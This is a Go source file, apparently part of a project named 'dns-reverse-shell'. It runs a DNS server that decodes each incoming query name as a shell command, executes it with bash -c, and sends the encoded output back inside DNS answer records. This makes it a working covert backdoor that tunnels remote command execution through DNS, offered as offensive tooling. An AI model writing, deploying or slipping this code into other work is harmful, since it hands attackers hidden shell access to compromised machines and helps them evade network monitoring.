package protocol

import (
	"dns-reverse-shell/main/encoder"
	"fmt"
	"github.com/miekg/dns"
	"os/exec"
)

type dnsHandler struct {
	server *DNSServer
}

func newDnsHandler(s *DNSServer) *dnsHandler {
	return &dnsHandler{server: s}
}

type DNSServer struct {
	port            string
	encoder         encoder.StringEncoder
	handler         *dnsHandler
	messageSplitter MessageSplitter
}

func NewDnsServer(port string, encoder encoder.StringEncoder) *DNSServer {
	d := &DNSServer{port: port, encoder: encoder}
	d.handler = newDnsHandler(d)
	d.messageSplitter = NewSimpleMessageSplitter()
	return d
}

func (s DNSServer) Serve() {
	server := s.createServer()

	fmt.Println("Starting DNS server on port 8090")
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}

func (s DNSServer) createServer() *dns.Server {
	server := &dns.Server{
		Addr:      ":" + s.port,
		Net:       "tcp",
		Handler:   s.handler,
		ReusePort: true,
	}
	return server
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, question := range r.Question {
		command := h.server.encoder.Decode(question.Name)
		output := executeCommand(command)
		encoded := h.server.encoder.Encode(output)
		splitMessage := h.server.messageSplitter.Split(encoded)
		for i := range splitMessage {
			msg.Answer = append(msg.Answer, splitMessage[i])
		}
	}
	err := w.WriteMsg(msg)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func executeCommand(command string) string {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return "command execution failed: " + err.Error()
	}
	return string(output)
}
